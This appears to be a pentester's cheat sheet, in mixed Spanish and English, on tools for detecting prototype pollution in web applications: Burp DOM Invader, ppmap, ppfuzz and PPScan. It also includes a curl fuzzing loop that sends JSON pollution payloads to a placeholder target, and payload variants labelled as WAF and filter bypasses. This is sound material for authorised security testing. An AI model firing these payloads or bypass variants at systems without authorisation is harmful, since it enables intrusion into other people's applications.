---
aliases:
  - DOM Invader
  - ppmap
  - PPScan
  - ppfuzz
tags:
  - type/cheatsheet
  - vuln/prototype-pollution
  - technique/discovery
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Prototype Pollution]]'
  - '[[Burp Suite]]'
---
# Prototype Pollution - Tooling

***

## Burp DOM Invader

| **Función** | **Acción** | **Notas** |
|:---:|:---:|:---:|
| Habilitar | Burp → DOM Invader → Enable + reload page | Built-in Burp Pro. |
| Auto-detection PP sources | Detecta `__proto__`, `constructor.prototype` en JS | Activo while browsing. |
| Auto-detection PP sinks | Detecta `eval`, `Function`, `setTimeout` con strings | Sinks reales. |
| Source-to-sink trace | Trace de input controlado al sink | Path completo. |
| Click-to-test | Auto-test con payload `{"polluted":"yes"}` | Testing rápido. |
| Source filter | Filtrar por tipo: hash / search / postMessage / cookies | Focus específico. |
| Custom source | Define source manual si no detecta auto | Edge cases. |
| Inject payload | UI permite inject payload custom + observar resultado | Manual exploration. |
| Stack tree exporter | Export findings para reporte | Save evidence. |
| Combinable con DOM XSS | DOM Invader detecta XSS también | Two-for-one. |
^pp-tool-burp-dom

___

## ppmap

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Repo | `https://github.com/kosmosec/proto-find` (ppmap evolved) | CLI scanner. |
| Probe URL | `python ppmap.py -u https://target/` | Scan URL parameters. |
| Multiple URLs | `python ppmap.py -l urls.txt` | Bulk. |
| Custom params | `python ppmap.py -u "https://target/?a=1&b=2" --params a,b` | Specific. |
| Output JSON | `--output findings.json` | Reportable. |
| Verbose | `-v` debug | Stack traces. |
| Threads | `-t 10` parallel | Speed. |
| Combine con Burp Collaborator | Set Collaborator URL para OOB confirmation | Reliable detection. |
^pp-tool-ppmap

___

## PPScan / ppfuzz

| **Tool** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| ppfuzz (Rust) | `git clone https://github.com/dwisiswant0/ppfuzz` | Fast Rust implementation. |
| ppfuzz run | `ppfuzz -l urls.txt` | Bulk URL scan. |
| ppfuzz custom payloads | `ppfuzz -l urls.txt -p custom-payloads.txt` | Custom set. |
| PPScan (npm) | `npm install -g ppscan` | Node-based. |
| PPScan run | `ppscan https://target/` | Default scan. |
| Manual fuzz with curl | Loop sobre payloads | Lo-tech alt. |
| ZAP plugin | OWASP ZAP tiene addon PP | Free option. |
| `prototype-pollution-finder` (Burp) | Burp ext separate de DOM Invader | Older alternative. |
^pp-tool-scanners

### Manual fuzz con curl

```bash
# Payloads PP comunes
PAYLOADS=(
  '{"__proto__":{"polluted":"yes"}}'
  '{"constructor":{"prototype":{"polluted":"yes"}}}'
  '{"__proto__.polluted":"yes"}'
  '{"a":{"__proto__":{"polluted":"yes"}}}'
)

for p in "${PAYLOADS[@]}"; do
  echo "Testing: $p"
  curl -s -X POST https://target/api/x \
    -H "Content-Type: application/json" \
    -d "$p"

  # Verify pollution
  curl -s https://target/api/health | grep -i polluted && echo "VULN with: $p"
done
```

___

## Custom Payloads y Wordlists

| **Wordlist** | **Path / Repo** | **Uso** |
|:---:|:---:|:---:|
| PortSwigger PP labs payloads | https://portswigger.net/web-security/prototype-pollution | Lab-tested. |
| PayloadsAllTheThings - PP | `PayloadsAllTheThings/Prototype Pollution/` | Comprehensive. |
| HackTricks PP | https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution | Compiled. |
| Server-side PP gadgets | `https://github.com/BlackFan/client-side-prototype-pollution` | Client-side mostly. |
| Server-side PP repo | `https://github.com/y0urb0at/prototype-pollution-cheatsheet` | Server-side. |
| `__proto__` variants | `__proto__`, `prototype`, `constructor.prototype`, etc | Filter bypass. |
| Bracket / dot notation | `[__proto__][x]`, `__proto__.x`, `__proto__[x]` | Different parsers. |
| URL-encoded variants | `%5F%5Fproto%5F%5F`, `%5f%5fproto%5f%5f` | WAF bypass. |
| Unicode variants | `____proto____` (escape) | Edge bypass. |
^pp-tool-payloads

### Verificación rápida de pollution exitosa

```javascript
// Browser console — después de pollute, verificar
({}).polluted  // si retorna 'yes' → polución global

// Server-side equivalent
const test = {};
console.log(test.polluted);  // si 'yes' → vulnerable
```

***
